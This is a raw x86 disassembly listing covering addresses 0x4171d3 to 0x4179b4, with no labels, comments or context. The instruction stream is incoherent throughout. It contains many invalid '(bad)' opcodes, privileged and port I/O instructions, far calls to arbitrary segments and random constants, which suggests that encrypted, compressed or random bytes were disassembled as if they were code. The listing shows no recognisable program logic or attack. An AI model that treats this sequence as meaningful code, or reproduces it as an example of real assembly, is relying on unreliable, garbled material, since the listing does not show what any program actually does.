  4171d3:	cmp    al,BYTE PTR [esi-0x47]
  4171d6:	mov    edx,0xd40c2f7b
  4171db:	pop    ebp
  4171dc:	inc    edx
  4171dd:	fimul  WORD PTR [ecx]
  4171df:	inc    esp
  4171e0:	sbb    DWORD PTR [ecx+0x7f440606],ebp
  4171e6:	pop    edi
  4171e7:	jno    0x417256
  4171e9:	xchg   esi,eax
  4171ea:	pop    es
  4171eb:	ret    
  4171ec:	outs   dx,DWORD PTR ds:[esi]
  4171ed:	mov    ds,esi
  4171ef:	(bad)  
  4171f1:	ja     0x417262
  4171f3:	popf   
  4171f4:	lods   eax,DWORD PTR ds:[esi]
  4171f5:	ins    DWORD PTR es:[edi],dx
  4171f6:	int3   
  4171f7:	xchg   esp,eax
  4171f8:	dec    edx
  4171f9:	int    0x93
  4171fb:	xchg   esi,eax
  4171fc:	mov    eax,ds:0xa64ab9ab
  417201:	lea    esp,[edi]
  417203:	inc    eax
  417204:	cld    
  417205:	push   cs
  417206:	and    cl,BYTE PTR [edx+0x6e]
  417209:	pop    esp
  41720a:	ret    0x501d
  41720d:	and    DWORD PTR [ecx+0x3e7474b7],edx
  417213:	jl     0x417201
  417215:	inc    esi
  417216:	sahf   
  417217:	mov    esp,0x91c56b4d
  41721c:	add    eax,0xbd3b56ce
  417221:	ds xchg ecx,eax
  417223:	inc    esp
  417224:	inc    esi
  417225:	mov    es,WORD PTR [edi-0x74]
  417228:	inc    BYTE PTR [ecx+0x16]
  41722b:	or     BYTE PTR [bp+0x1d],ah
  41722f:	and    BYTE PTR [edx-0x3dbb20c4],bl
  417235:	sbb    eax,0x458b76c3
  41723a:	sbb    al,0xef
  41723c:	rcr    BYTE PTR [edi],cl
  41723e:	jge    0x41720d
  417240:	mov    ebp,0x10a0de5e
  417245:	sbb    eax,0xe4eb98dd
  41724a:	test   al,0xf6
  41724c:	add    BYTE PTR [ebp-0x15],ch
  41724f:	xchg   esi,eax
  417250:	enter  0xe14a,0xfe
  417254:	rcl    BYTE PTR [eax],0x19
  417257:	(bad)  
  417258:	mov    al,0x40
  41725a:	and    DWORD PTR es:[edi-0x46],ecx
  41725e:	mov    eax,0x6099e6ea
  417263:	lea    edi,[eax-0x1b]
  417266:	add    ch,BYTE PTR ds:0x4fa550ab
  41726c:	popf   
  41726d:	inc    edx
  41726e:	test   BYTE PTR [eax-0x1bdfc200],ch
  417274:	ss leave 
  417276:	pop    ebp
  417277:	lods   al,BYTE PTR ds:[esi]
  417278:	cmp    edi,DWORD PTR [ebx-0x175d4001]
  41727e:	(bad)  
  41727f:	cmp    BYTE PTR [eax+0x4c4df1d3],ch
  417285:	je     0x41727d
  417287:	xchg   ecx,eax
  417288:	pop    esp
  417289:	xor    al,0x5b
  41728b:	xchg   esi,eax
  41728c:	jae    0x41727a
  41728e:	mov    ds,WORD PTR [ecx-0x28423bd6]
  417294:	push   edi
  417295:	(bad)  
  417296:	(bad)  
  417297:	and    BYTE PTR [ebx+eiz*2+0x6c],bh
  41729b:	int3   
  41729c:	bnd jno 0x4172a9
  41729f:	in     al,dx
  4172a0:	adc    eax,eax
  4172a2:	or     DWORD PTR gs:[edx-0x2c],0x61
  4172a7:	jnp    0x4172f1
  4172a9:	retf   0x3ad9
  4172ac:	push   eax
  4172ad:	repnz popf 
  4172af:	add    dl,BYTE PTR [esi-0x611130fe]
  4172b5:	push   ebp
  4172b6:	lds    esp,FWORD PTR [edx+ebp*8]
  4172b9:	imul   edx,DWORD PTR [ecx+0x7d],0x1c13fa3
  4172c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4172c1:	loope  0x41724f
  4172c3:	sahf   
  4172c4:	fidivr WORD PTR [ebp-0x6d9f88cb]
  4172ca:	sar    BYTE PTR [eax],1
  4172cc:	cdq    
  4172cd:	xchg   eax,ebx
  4172cf:	push   es
  4172d0:	retw   0x8e2
  4172d4:	xchg   BYTE PTR [esi],ch
  4172d6:	fisub  DWORD PTR [ecx-0x643d02a6]
  4172dc:	cli    
  4172dd:	or     DWORD PTR [ebp+edi*8-0x4],esi
  4172e1:	xchg   edi,eax
  4172e2:	sbb    dl,ch
  4172e4:	shl    BYTE PTR [ebx],0x6
  4172e7:	xor    al,0x3f
  4172e9:	lods   eax,DWORD PTR ds:[esi]
  4172ea:	push   cs
  4172eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4172ec:	dec    edi
  4172ed:	call   DWORD PTR [edi-0x341f7f57]
  4172f3:	mov    eax,0x6b6991e
  4172f8:	add    DWORD PTR [eax],edi
  4172fa:	stos   DWORD PTR es:[edi],eax
  4172fb:	adc    dl,BYTE PTR [edi-0x29]
  4172fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4172ff:	ins    BYTE PTR es:[edi],dx
  417300:	sbb    al,0xb6
  417302:	push   0x52778d7d
  417307:	sub    al,BYTE PTR [edx+0x57]
  41730a:	cmp    DWORD PTR [esi+0x3f50fd68],edi
  417310:	adc    al,BYTE PTR [eax]
  417312:	push   0x64
  417314:	ficomp DWORD PTR [eax+0x1e]
  417317:	bound  ecx,QWORD PTR [ecx+edx*2+0xa]
  41731b:	mov    dl,0xc2
  41731d:	pusha  
  41731e:	loop   0x4172da
  417320:	xor    al,0xb2
  417322:	jbe    0x4172c1
  417324:	jbe    0x4172d0
  417326:	jecxz  0x4172f9
  417328:	outs   dx,DWORD PTR ds:[esi]
  417329:	arpl   WORD PTR [eax],cx
  41732b:	mov    cl,0xb6
  41732d:	nop
  41732e:	arpl   WORD PTR [edi],dx
  417330:	out    dx,eax
  417331:	pop    ds
  417332:	iret   
  417333:	xchg   ecx,eax
  417334:	data16 aad 0x85
  417337:	shl    BYTE PTR [eax+ebx*2+0x3d],0xc
  41733c:	repz mov esi,0x3c7553f6
  417342:	or     DWORD PTR [edx-0x3b],0x7c38fa6
  417349:	xchg   BYTE PTR [esi+0x4c],al
  41734c:	mov    cl,bh
  41734e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41734f:	jmp    0x4172d8
  417351:	mov    dh,0x1e
  417353:	shr    ch,0xf7
  417356:	(bad)  
  417357:	imul   edx,ebx,0x7c
  41735a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41735b:	(bad)  
  41735d:	dec    edi
  41735e:	test   eax,0xa690efc4
  417364:	dec    eax
  417365:	mov    eax,ds:0x2a632b1d
  41736a:	inc    esp
  41736b:	mov    edi,0xc69094cd
  417370:	int    0xa7
  417372:	sar    DWORD PTR [ecx+0x63],cl
  417375:	add    DWORD PTR [esi],esp
  417377:	lods   al,BYTE PTR ds:[esi]
  417378:	pusha  
  417379:	push   0x5db7e4ed
  41737e:	inc    esp
  41737f:	mov    bx,0xb973
  417383:	(bad)
  417386:	push   0xc9b85d88
  41738b:	pop    esp
  41738c:	mov    fs,edi
  41738e:	pushf  
  41738f:	pop    ebx
  417390:	xchg   edx,eax
  417391:	aam    0x37
  417393:	mov    eax,ds:0x61a440c3
  417398:	push   es
  417399:	test   DWORD PTR [ebp-0x3d17e1d2],eax
  41739f:	sub    esi,DWORD PTR [edx+edx*2]
  4173a2:	and    DWORD PTR [eax+0x1f34de5b],eax
  4173a8:	jle    0x417392
  4173aa:	aas    
  4173ab:	(bad)
  4173ae:	and    al,cl
  4173b0:	pop    ss
  4173b1:	js     0x4173f0
  4173b3:	std    
  4173b4:	cli    
  4173b5:	pop    esp
  4173b6:	push   esi
  4173b7:	dec    edi
  4173b8:	pop    edx
  4173b9:	sahf   
  4173ba:	inc    edx
  4173bb:	test   BYTE PTR [esi+0x63],dh
  4173be:	adc    DWORD PTR [ebx-0x29f15aef],ecx
  4173c4:	mov    ebp,0xe980b7f0
  4173c9:	inc    esi
  4173ca:	jo     0x417418
  4173cc:	jne    0x4173f7
  4173ce:	sbb    eax,0x8a80d318
  4173d3:	inc    esi
  4173d4:	fucom  st(1)
  4173d6:	pop    ebx
  4173d7:	and    DWORD PTR [edx+0x1ae2fce4],edx
  4173dd:	mov    ah,0x19
  4173df:	fsubr  DWORD PTR [edi+0x892c393]
  4173e5:	xor    al,0x38
  4173e7:	outs   dx,DWORD PTR ds:[esi]
  4173e8:	test   cl,ch
  4173ea:	dec    esi
  4173eb:	add    DWORD PTR [ebx+0x48],ecx
  4173ee:	test   eax,0xe6862b39
  4173f3:	pushf  
  4173f4:	pop    edx
  4173f5:	jg     0x4173da
  4173f7:	out    0x56,eax
  4173f9:	sbb    edi,DWORD PTR [edi+eax*2]
  4173fc:	adc    BYTE PTR [edi],ch
  4173fe:	jo     0x41747d
  417400:	dec    edi
  417401:	pop    esp
  417402:	mov    esp,0x9eee162a
  417407:	adc    eax,0x53a9324a
  41740c:	pop    ebx
  41740d:	push   ecx
  41740e:	gs xchg edi,eax
  417410:	inc    ebx
  417411:	cmp    DWORD PTR ds:0xcda11218,0xb479d4c3
  41741b:	adc    DWORD PTR [esp+eiz*8+0x42],0x14
  417420:	mov    DWORD PTR [ebx-0x26db7d23],ecx
  417426:	mov    ds:0x4e25c350,eax
  41742b:	cld    
  41742c:	jmp    0x4173d8
  41742e:	je     0x41748e
  417430:	das    
  417431:	mov    cl,0x30
  417433:	loopne 0x417493
  417435:	dec    eax
  417436:	dec    ecx
  417437:	add    DWORD PTR [edi+edx*2-0x73aca876],0xfffffff8
  41743f:	mov    edi,0xdcd9e22a
  417444:	or     al,0xa8
  417446:	pop    ebp
  417447:	outs   dx,DWORD PTR ds:[esi]
  417448:	popa   
  417449:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41744a:	mov    esp,eax
  41744c:	je     0x41747a
  41744e:	jb     0x417434
  417450:	push   edx
  417451:	frstor [eax]
  417453:	std    
  417454:	dec    edi
  417455:	pop    eax
  417456:	retf   0x61a5
  417459:	je     0x4173ed
  41745b:	popa   
  41745c:	fdivr  DWORD PTR [ecx-0x1776f6b8]
  417462:	jge    0x4174c6
  417464:	sahf   
  417465:	loope  0x41749c
  417467:	mov    esp,0xbb845b48
  41746c:	mov    ebx,0xd8c430da
  417471:	fisub  WORD PTR [eax-0x66796ce4]
  417477:	or     BYTE PTR [edx],0x9e
  41747a:	mov    ch,ch
  41747c:	cmp    dh,BYTE PTR [edi+0x7b66ad6]
  417482:	mov    dh,0x16
  417484:	mov    DWORD PTR [edi+0x27],ebx
  417487:	scas   al,BYTE PTR es:[edi]
  417488:	addr16 into 
  41748a:	sub    eax,0xa0c7374c
  41748f:	add    ah,BYTE PTR [eax+0x6b198ed]
  417495:	add    dh,ah
  417497:	mov    DWORD PTR [ecx],edi
  417499:	aas    
  41749a:	imul   ebp,DWORD PTR [ebx-0x336b934e],0x6a
  4174a1:	leave  
  4174a2:	sbb    DWORD PTR [ecx+0x6a],ebp
  4174a5:	fstp   QWORD PTR [eax+0x181e83be]
  4174ab:	cmp    DWORD PTR [esi+0x1e],edi
  4174ae:	call   0xef9b:0x580c2da
  4174b5:	out    dx,eax
  4174b6:	push   esp
  4174b7:	mov    al,ds:0x63d7efc9
  4174bc:	ins    BYTE PTR es:[edi],dx
  4174bd:	aam    0x40
  4174bf:	das    
  4174c0:	dec    edx
  4174c1:	pop    ecx
  4174c2:	ja     0x4174d0
  4174c4:	mov    DWORD PTR [edx+edi*2],edi
  4174c7:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  4174c9:	cmc    
  4174ca:	and    dh,cl
  4174cc:	mov    bl,bh
  4174ce:	les    ecx,FWORD PTR [ebx+0x77258b41]
  4174d4:	ins    BYTE PTR es:[edi],dx
  4174d5:	cdq    
  4174d6:	add    ah,cl
  4174d8:	rol    DWORD PTR [ecx-0x382ee441],cl
  4174de:	xor    eax,0xb5eef068
  4174e3:	dec    esp
  4174e4:	out    0x18,al
  4174e6:	xor    BYTE PTR [ecx-0x1b],dh
  4174e9:	arpl   bp,cx
  4174eb:	fiadd  DWORD PTR [edi+eiz*4-0x628f8ca2]
  4174f2:	push   es
  4174f3:	lock dec edi
  4174f5:	mov    dl,0x8a
  4174f7:	push   es
  4174f8:	xchg   edx,eax
  4174f9:	addr16 daa 
  4174fb:	enter  0xa2a1,0xa1
  4174ff:	inc    ebx
  417500:	stc    
  417501:	call   0x42d0e353
  417506:	retf   
  417507:	jge    0x4174b2
  417509:	mov    eax,eax
  41750b:	add    cl,BYTE PTR [edi]
  41750d:	inc    eax
  41750e:	aaa    
  41750f:	or     eax,0x4f1684d4
  417514:	inc    ebp
  417515:	ds (bad) 
  417517:	call   0x327abc0f
  41751c:	cs das 
  41751e:	xor    eax,0x4976b556
  417523:	xchg   DWORD PTR [edx+edx*8+0x22],esi
  417527:	pop    es
  417528:	and    dl,BYTE PTR [edi-0x46]
  41752b:	into   
  41752c:	cwde   
  41752d:	sub    eax,0x2ad74da7
  417532:	ret    
  417533:	enter  0xc5d3,0x11
  417537:	retf   0x4844
  41753a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41753b:	pusha  
  41753c:	mov    eax,ds:0xfae53199
  417541:	cmpxchg BYTE PTR [eax+0x2ceddfb],ch
  417548:	xchg   ebp,eax
  417549:	push   edi
  41754a:	fst    QWORD PTR [ecx]
  41754c:	jle    0x417578
  41754e:	loopne 0x417523
  417550:	mov    edx,0x6e345576
  417555:	in     eax,dx
  417556:	and    BYTE PTR [eax],dh
  417558:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417559:	icebp  
  41755a:	pop    edi
  41755b:	fmul   st(3),st
  41755d:	pop    ecx
  41755e:	ret    
  41755f:	icebp  
  417560:	clc    
  417561:	lds    edi,FWORD PTR [eax]
  417563:	aad    0x97
  417565:	and    DWORD PTR [edx+0x1c],ebp
  417568:	je     0x41752d
  41756a:	pop    esi
  41756b:	jbe    0x4175aa
  41756d:	sub    eax,0xe0d246e6
  417572:	addr16 jnp 0x417551
  417575:	inc    edi
  417576:	pop    eax
  417577:	sbb    BYTE PTR [edi],bl
  417579:	adc    al,0xcd
  41757b:	fldenv [ecx+0x3456bd36]
  417581:	xchg   ebx,eax
  417582:	std    
  417583:	mov    edi,edx
  417585:	xchg   edi,eax
  417586:	fdivr  QWORD PTR [esi-0x30f8d2c]
  41758c:	(bad)  
  41758d:	fdiv   DWORD PTR [edx+edi*2-0x6cb37b5a]
  417594:	push   esp
  417595:	outs   dx,DWORD PTR ds:[esi]
  417596:	mov    ch,0x1d
  417598:	cmp    edx,edi
  41759a:	ins    BYTE PTR es:[edi],dx
  41759b:	aaa    
  41759c:	or     eax,ebx
  41759e:	mov    ah,0x4a
  4175a0:	pop    edi
  4175a1:	mov    edx,0x4ad12a94
  4175a6:	retf   0xf6f2
  4175a9:	and    al,0xba
  4175ab:	push   ebx
  4175ac:	call   0xfc06:0x5bbfb50f
  4175b3:	mov    ds:0xcd156d64,al
  4175b8:	push   ebp
  4175b9:	push   ss
  4175ba:	mov    ebx,0x69ecba0b
  4175bf:	(bad)  
  4175c0:	stc    
  4175c1:	clc    
  4175c2:	es in  al,0xb9
  4175c5:	sbb    DWORD PTR [esi],0xc839db5b
  4175cb:	js     0x417625
  4175cd:	lds    ebx,FWORD PTR [ecx]
  4175cf:	push   ecx
  4175d0:	mov    bl,dl
  4175d2:	xlat   BYTE PTR ds:[bx]
  4175d4:	fcom   QWORD PTR [eax]
  4175d6:	test   eax,0x57f93e7b
  4175db:	add    al,0x7d
  4175de:	ret    
  4175df:	mov    ss,WORD PTR [ecx+0x40]
  4175e2:	fistp  DWORD PTR [edi+esi*1]
  4175e5:	sbb    al,0x18
  4175e7:	pop    ecx
  4175e8:	dec    edx
  4175e9:	(bad)  
  4175ea:	add    eax,DWORD PTR [bp-0x44fd]
  4175ef:	push   esp
  4175f0:	scas   al,BYTE PTR es:[edi]
  4175f1:	fsubr  st,st(3)
  4175f3:	mov    ebx,0xabd27996
  4175f8:	addr16 daa 
  4175fa:	dec    ecx
  4175fb:	mov    bl,0xd4
  4175fd:	enter  0x345d,0xb4
  417601:	mov    ds:0x1766c642,eax
  417606:	popa   
  417607:	lar    edx,WORD PTR [si-0x25]
  41760c:	cmp    bl,BYTE PTR ss:[esi-0x162bc267]
  417613:	test   ebx,ebx
  417615:	mov    ds:0xb399aad7,al
  41761a:	xor    ebx,ecx
  41761c:	cs clc 
  41761e:	add    al,0xb1
  417620:	pop    es
  417621:	js     0x417668
  417623:	in     eax,0x54
  417625:	jecxz  0x417641
  417627:	cmp    cl,ch
  417629:	lods   eax,DWORD PTR ds:[esi]
  41762a:	hlt    
  41762b:	dec    esp
  41762c:	test   esp,ebp
  41762e:	jae    0x4175bf
  417630:	push   esp
  417631:	or     ah,BYTE PTR [eax+edi*2]
  417634:	jg     0x41765a
  417636:	adc    al,0x79
  417638:	cwde   
  417639:	sahf   
  41763a:	sbb    esp,edi
  41763c:	js     0x41766b
  41763e:	jmp    0x1d41278
  417643:	pusha  
  417644:	and    DWORD PTR [ebx+0x5f59847e],ebp
  41764a:	fsubp  st(2),st
  41764c:	mov    dl,0xdc
  41764e:	mov    esp,0xc68122b8
  417653:	cmp    al,0x3e
  417655:	shl    DWORD PTR [edx],cl
  417657:	pop    ebp
  417658:	leave  
  417659:	in     eax,0xcf
  41765b:	inc    esi
  41765c:	mov    al,0x9b
  41765e:	call   0x5269:0xf351db4f
  417665:	push   esp
  417666:	sahf   
  417667:	aam    0x90
  417669:	js     0x417674
  41766b:	jae    0x4176b9
  41766d:	and    eax,0xdb92534d
  417672:	out    0x41,eax
  417674:	sbb    al,0xbc
  417676:	add    eax,0x75fc9cbf
  41767b:	mov    WORD PTR [eax],ds
  41767d:	jle    0x417640
  41767f:	pop    ds
  417680:	mov    gs,WORD PTR [eax-0x73]
  417683:	push   0x65610f8b
  417688:	sub    esp,DWORD PTR [ecx-0x3]
  41768b:	sbb    DWORD PTR [esi-0x20db8f1f],esi
  417691:	pop    edi
  417692:	scas   al,BYTE PTR es:[edi]
  417693:	test   DWORD PTR [ecx-0x4f],eax
  417696:	fs arpl cx,cx
  417699:	jb     0x4176ea
  41769b:	or     bh,BYTE PTR [esi]
  41769d:	(bad)  
  41769e:	fisttp WORD PTR [ebx-0x16]
  4176a1:	mov    bh,0x7c
  4176a3:	lahf   
  4176a4:	push   ds
  4176a5:	push   0x5836aa27
  4176aa:	(bad)  gs:0xddd4cf60
  4176b1:	mov    edi,0x67184554
  4176b6:	and    BYTE PTR [ebx+0x24fc9a76],al
  4176bc:	les    eax,FWORD PTR [esi+0x1a]
  4176bf:	shl    DWORD PTR [ebx+0x5293d18],1
  4176c5:	ret    0x47a0
  4176c8:	push   ecx
  4176c9:	add    DWORD PTR [eax+0x6],ebp
  4176cc:	cmp    al,0xc2
  4176ce:	stos   DWORD PTR es:[edi],eax
  4176cf:	outs   dx,DWORD PTR ds:[esi]
  4176d0:	repz push edx
  4176d2:	mov    dl,0x4b
  4176d4:	mov    WORD PTR [esi+0x781557a7],es
  4176da:	add    al,0xe6
  4176dc:	scas   eax,DWORD PTR es:[edi]
  4176dd:	xor    eax,0x57736695
  4176e2:	adc    eax,0x9c107459
  4176e7:	fs pushf 
  4176e9:	xor    cl,BYTE PTR [ebp-0xb97b24e]
  4176ef:	mov    al,ds:0xff097b8
  4176f4:	sar    BYTE PTR [edx-0x7f9950a6],0xc6
  4176fb:	jnp    0x417741
  4176fd:	xor    eax,0x44e62ece
  417702:	add    esi,edi
  417704:	cld    
  417705:	inc    ebp
  417706:	aad    0x2e
  417708:	mov    dl,0x90
  41770a:	getsec 
  41770c:	xor    edx,DWORD PTR [ebp+0x5102d75b]
  417712:	int    0xc2
  417714:	inc    ebp
  417715:	sbb    eax,0x8ee4f6fe
  41771a:	sub    eax,0xa0180d80
  41771f:	jp     0x4176b9
  417721:	fwait
  417722:	jo     0x4176d2
  417724:	or     BYTE PTR [ebx-0x6b774300],dl
  41772a:	cld    
  41772b:	lods   eax,DWORD PTR ds:[esi]
  41772c:	sub    al,0xde
  41772e:	fsincos 
  417730:	sbb    eax,0x5dd7c795
  417735:	xchg   ebp,eax
  417736:	call   FWORD PTR [esi+0x2487aac4]
  41773c:	int3   
  41773d:	mov    esi,0xbdcbbf8
  417742:	push   ss
  417743:	xor    eax,0x77110d03
  417748:	repz je 0x417729
  41774b:	xchg   DWORD PTR [ebp+0x693f9d82],ebp
  417751:	add    BYTE PTR [esi+eax*4-0x5295303d],cl
  417758:	mov    dl,dl
  41775a:	std    
  41775b:	and    edi,ebp
  41775d:	mov    esi,0x76fb20c8
  417762:	or     eax,0x3dec8946
  417767:	mov    WORD PTR [edi-0x5be7367b],cs
  41776d:	push   ds
  41776e:	pop    edi
  41776f:	add    al,0x6e
  417771:	les    edx,FWORD PTR [edx-0x7f]
  417774:	xchg   ecx,eax
  417775:	add    DWORD PTR [edx-0x3e],esp
  417778:	adc    eax,0x9ccf9ea7
  41777d:	mov    dl,0xfa
  41777f:	gs sysexit 
  417782:	fs stos BYTE PTR es:[edi],al
  417784:	pop    es
  417785:	and    al,0x1b
  417787:	jns    0x417733
  417789:	retf   
  41778a:	(bad)  
  41778c:	sbb    BYTE PTR [ebx+0x46],al
  41778f:	xlat   BYTE PTR ds:[ebx]
  417790:	dec    edi
  417791:	popa   
  417792:	pop    eax
  417793:	cwde   
  417794:	xchg   BYTE PTR [ebx],ch
  417796:	jae    0x4177c5
  417798:	xchg   BYTE PTR [edx+edx*1],dh
  41779b:	xchg   ecx,eax
  41779c:	mov    bl,0x85
  41779e:	gs xchg ecx,ecx
  4177a1:	adc    esp,ebp
  4177a3:	aas    
  4177a4:	cdq    
  4177a5:	inc    esp
  4177a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4177a7:	jmp    0x417756
  4177a9:	sub    DWORD PTR [eax-0x626a6310],esi
  4177af:	mov    bh,0xe7
  4177b1:	pop    ss
  4177b2:	mov    ds:0x3abd359d,al
  4177b7:	loopne 0x417811
  4177b9:	and    cl,BYTE PTR [ecx-0x482dfe1b]
  4177bf:	push   eax
  4177c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4177c1:	into   
  4177c2:	(bad)  
  4177c3:	lsl    esi,WORD PTR [ebx-0x52]
  4177c7:	xor    ah,BYTE PTR [ecx-0x30bb310a]
  4177cd:	or     ecx,DWORD PTR [edi]
  4177cf:	shl    BYTE PTR [ebx],cl
  4177d1:	jp     0x417771
  4177d3:	out    dx,al
  4177d4:	push   ebp
  4177d5:	sbb    ecx,edx
  4177d7:	imul   edi,DWORD PTR [ebx+0x6e0758e3],0xf83f92eb
  4177e1:	addr16 into 
  4177e3:	xchg   edx,eax
  4177e4:	repz add ch,BYTE PTR [edx-0x6f95146f]
  4177eb:	mov    esp,0xb30bcd7e
  4177f0:	adc    cl,ah
  4177f2:	in     al,0xb5
  4177f4:	lods   eax,DWORD PTR ds:[esi]
  4177f5:	test   al,0xe2
  4177f7:	pop    esi
  4177f8:	sub    eax,esp
  4177fa:	daa    
  4177fb:	mov    ds:0x616d939a,eax
  417800:	arpl   WORD PTR [esi-0x60],sp
  417803:	pop    edx
  417804:	and    esi,DWORD PTR [ecx]
  417806:	pop    esp
  417807:	cdq    
  417808:	ss (bad) 
  41780a:	hlt    
  41780b:	adc    al,0xb7
  41780d:	dec    eax
  41780e:	cmp    BYTE PTR [edx+edi*2],0x8
  417812:	bound  eax,QWORD PTR [ecx]
  417814:	jmp    0xdcbe:0xb7243eb5
  41781b:	pusha  
  41781c:	and    DWORD PTR [ecx],esi
  41781e:	push   eax
  41781f:	inc    edi
  417820:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417821:	pop    ds
  417822:	mov    al,0x4b
  417824:	jo     0x4177f2
  417826:	and    dh,dl
  417828:	out    dx,eax
  417829:	popa   
  41782a:	scas   eax,DWORD PTR es:[edi]
  41782b:	fadd   st(4),st
  41782d:	add    eax,0xbdd744ff
  417832:	(bad)  
  417833:	loopne 0x417895
  417835:	cld    
  417836:	sub    BYTE PTR [ebp+0x7ac24d4e],cl
  41783c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41783d:	sbb    eax,0xbbf5cd4b
  417842:	add    DWORD PTR [ebx+0x22],edx
  417845:	cld    
  417846:	popf   
  417847:	pop    ds
  417848:	inc    ebx
  417849:	adc    eax,0xd30f5bbe
  41784e:	aaa    
  41784f:	push   esp
  417850:	pop    ds
  417851:	repnz xchg ecx,eax
  417853:	je     0x4177d7
  417855:	push   esp
  417856:	dec    ebx
  417857:	inc    edx
  417858:	or     al,0xf7
  41785a:	jecxz  0x417854
  41785c:	rcr    BYTE PTR [edx-0x4c],0xfd
  417860:	xor    bl,BYTE PTR [esi-0x3e]
  417863:	xchg   esi,eax
  417864:	pop    esi
  417865:	ss cld 
  417867:	sbb    al,0x34
  417869:	jge    0x417889
  41786b:	cmp    al,BYTE PTR [edi]
  41786d:	push   es
  41786e:	hlt    
  41786f:	cmp    eax,0xe46165d1
  417874:	cli    
  417875:	lea    edi,ds:0xc8ba56cb
  41787b:	ds mov ebp,0xb9a98d52
  417881:	jge    0x4178dc
  417883:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417884:	xchg   ebx,eax
  417885:	das    
  417886:	mov    ebx,DWORD PTR ss:[edx+eax*4]
  41788a:	inc    ebp
  41788b:	pop    eax
  41788c:	jmp    0x4178c2
  41788e:	sbb    BYTE PTR [esi+esi*1],0xcd
  417892:	mov    al,0x78
  417894:	mov    ?,ebx
  417896:	bound  ebx,QWORD PTR [ebx+eax*1-0x266bd96f]
  41789d:	ror    DWORD PTR [ebx],cl
  41789f:	es dec eax
  4178a1:	stc    
  4178a2:	dec    eax
  4178a3:	aam    0xdd
  4178a5:	call   0xc348:0xcab4e1eb
  4178ac:	jl     0x417867
  4178ae:	adc    al,0x2a
  4178b0:	fs popf 
  4178b2:	or     al,bh
  4178b4:	sbb    BYTE PTR [edx+0x74f029b0],ch
  4178ba:	mov    BYTE PTR [ecx],bl
  4178bc:	pop    ss
  4178bd:	xor    BYTE PTR [edi+0x63a9dda2],cl
  4178c3:	aaa    
  4178c4:	push   ecx
  4178c5:	cwde   
  4178c6:	cld    
  4178c7:	and    edx,edx
  4178c9:	inc    ecx
  4178ca:	pop    es
  4178cb:	test   esp,edi
  4178cd:	or     edi,0xffffff97
  4178d0:	jbe    0x4178aa
  4178d2:	mov    gs,edx
  4178d4:	hlt    
  4178d5:	xor    DWORD PTR [ecx-0x2a9d5502],eax
  4178db:	sub    ecx,DWORD PTR [ecx+eax*4]
  4178de:	clc    
  4178df:	jnp    0x4178be
  4178e1:	ret    
  4178e2:	out    0xd3,al
  4178e4:	es push ebp
  4178e6:	mov    eax,ds:0x81c02012
  4178eb:	stos   BYTE PTR es:[edi],al
  4178ec:	dec    ebx
  4178ed:	ret    
  4178ee:	and    eax,0x70adc39e
  4178f3:	aas    
  4178f4:	out    dx,eax
  4178f5:	adc    edi,DWORD PTR [ebx]
  4178f7:	cli    
  4178f8:	(bad)  
  4178fa:	xchg   edx,ecx
  4178fc:	test   DWORD PTR [edi],0xaea31e2f
  417902:	add    BYTE PTR [edx+0x3],0x3a
  417906:	loop   0x4178da
  417908:	sbb    DWORD PTR [ecx],ecx
  41790a:	inc    eax
  41790b:	stos   BYTE PTR es:[edi],al
  41790c:	cld    
  41790d:	test   BYTE PTR [eax-0x6f],dh
  417910:	push   ds
  417911:	mov    ebx,0x2f32717b
  417916:	test   eax,0x652831e9
  41791b:	daa    
  41791c:	xchg   BYTE PTR [ecx],dh
  41791e:	dec    ebx
  41791f:	jns    0x4178df
  417921:	popa   
  417922:	push   ds
  417923:	cdq    
  417924:	xchg   ebp,eax
  417925:	sub    eax,0xd2e5bc8b
  41792a:	mov    DWORD PTR [edi+0x73],0xb677c26a
  417931:	mov    ch,0x5a
  417933:	popf   
  417934:	cli    
  417935:	xor    eax,0x2ee835f7
  41793a:	scas   eax,DWORD PTR es:[edi]
  41793b:	pop    ds
  41793c:	mov    bh,0x61
  41793e:	mov    dl,0x5a
  417940:	retf   
  417941:	mov    ebp,0x14d50b2a
  417946:	daa    
  417947:	push   es
  417948:	sbb    al,0x17
  41794a:	sbb    eax,DWORD PTR [eax+0x6d]
  41794d:	sub    BYTE PTR [ebx+ebp*8],bh
  417950:	fdiv   st,st(5)
  417952:	in     al,0xbd
  417954:	add    dh,BYTE PTR [edx-0x58970b42]
  41795a:	jns    0x417963
  41795c:	jb     0x4178e3
  41795e:	into   
  41795f:	mov    al,0x71
  417961:	js     0x417966
  417963:	les    edx,FWORD PTR [ebx+0x16]
  417966:	mov    ebx,0xce6e7f27
  41796b:	not    BYTE PTR [ebp+edx*4-0x41]
  41796f:	mov    al,ds:0x6b7fd262
  417974:	shl    BYTE PTR [edx],0x84
  417977:	aam    0x60
  417979:	mov    BYTE PTR [eax],dh
  41797b:	stos   DWORD PTR es:[edi],eax
  41797c:	dec    esp
  41797d:	ret    
  41797e:	and    ebp,DWORD PTR [eax+edi*8+0x71]
  417982:	ins    BYTE PTR es:[edi],dx
  417983:	adc    eax,0x8544e582
  417988:	xor    DWORD PTR [edx],esi
  41798a:	xchg   ebx,eax
  41798b:	push   ss
  41798c:	dec    ebp
  41798d:	mov    ah,0x72
  41798f:	out    dx,al
  417990:	ret    
  417991:	pop    edi
  417992:	ret    
  417993:	clc    
  417994:	add    BYTE PTR [edx+0x6095a58f],dl
  41799a:	ficom  WORD PTR [esi+0x4dcdcb78]
  4179a0:	sub    eax,0xae22f872
  4179a5:	aad    0xaf
  4179a7:	pop    esi
  4179a8:	inc    DWORD PTR [esi]
  4179aa:	xchg   esp,eax
  4179ab:	mov    al,ds:0x5a77eef3
  4179b0:	push   edx
  4179b1:	jle    0x41798c
  4179b3:	pop    ss
  4179b4:	jns    0x4179c3
